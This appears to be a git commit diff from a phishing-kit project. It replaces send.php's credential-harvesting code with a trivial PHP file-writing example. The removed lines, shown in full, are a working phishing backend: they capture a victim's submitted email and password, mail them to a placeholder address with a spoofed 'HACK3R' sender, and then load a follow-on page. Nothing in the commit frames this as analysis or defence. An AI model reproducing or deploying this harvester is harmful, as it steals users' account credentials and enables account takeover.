de2e309db2799017014ef3545ef2e0505246e10e
Sachin <iamsachinshet@gmail.com>
2022-10-29 18:01:24 +0530

    Update send.php

--- send.php
+++ send.php
@@ -1,22 +1,8 @@
 <?php
-        $mailhacked = $_POST["email"];
-        $passwordhacked = $_POST["password"];
-         $to = "yourmailaddresshere@gmail.com";
-         $subject = "Workshop Gmail password";
-         
-         $message = "$mailhacked";
-         $message .= "<br>$passwordhacked";
-         
-         $header = "From:HACK3R@Hack3r.com \r\n";
-         $header .= "Cc:abcd@somedomain.com \r\n";
-         $header .= "MIME-Version: 1.0\r\n";
-         $header .= "Content-type: text/html\r\n";
-         
-         $retval = mail($to,$subject,$message,$header);
-         
-         if( $retval == true ) {
-            include("MKR.php");
-         }else {
-            echo "Message could not be sent...404 error check your internet";
-         }
-      ?>
+$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
+$txt = "Mickey Mouse\n";
+fwrite($myfile, $txt);
+$txt = "Minnie Mouse\n";
+fwrite($myfile, $txt);
+fclose($myfile);
+?>
